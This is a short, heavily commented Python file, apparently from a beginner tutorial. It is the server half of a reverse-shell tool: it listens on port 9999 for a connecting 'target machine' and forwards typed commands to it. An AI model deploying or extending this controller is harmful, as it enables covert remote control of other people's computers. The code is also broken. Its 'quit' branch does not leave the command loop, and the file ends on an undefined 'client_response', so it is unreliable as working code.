##server file

import socket
#socket is a way for two computers to connect
import sys
##to run system commands from python

#creating a socket
def socket_Create():
	try:
		#three global vars
		global host #ip address to connect to
		global port 
		global s #actual socket/conversation btwn server and target machine
		host = '' #just gonna be itself
		port = 9999 #a port is basically a way for your pc to identify what data is coming in
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))

##Binding the socket to the port and wait for connection from target machine
def socket_Bind():
	try:
		global host #ip address to connect to
		global port 
		global s #actual socket/conversation btwn server and target machine
		print("Binding socket to port: " + str(port))
		s.bind((host, port))
		s.listen(5) #allows server to accept connection
		## 5 is the number of bad connections it'll take before refusing connections
	except socket.error as msg:
		print("Socket creation error: " + str(msg) + "\n" + "Retrying...")
		socket_Bind() #recursion


#just listening by listen(), now we need to connect
#Establish a connection with client (socket must be listening for them)
def socket_Accept():
	conn, address = s.accept() #code won't continue until connection is established
	print("Connection has been established with IP " + str(address[0]) + "and port " + str(address[1]))
	send_commands(conn) #sit and wait for commands
	conn.close()

#send commands to target machine
def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
		if len(str.encode(cmd)) > 0:
			conn.send(str.encode(cmd))
			client_response



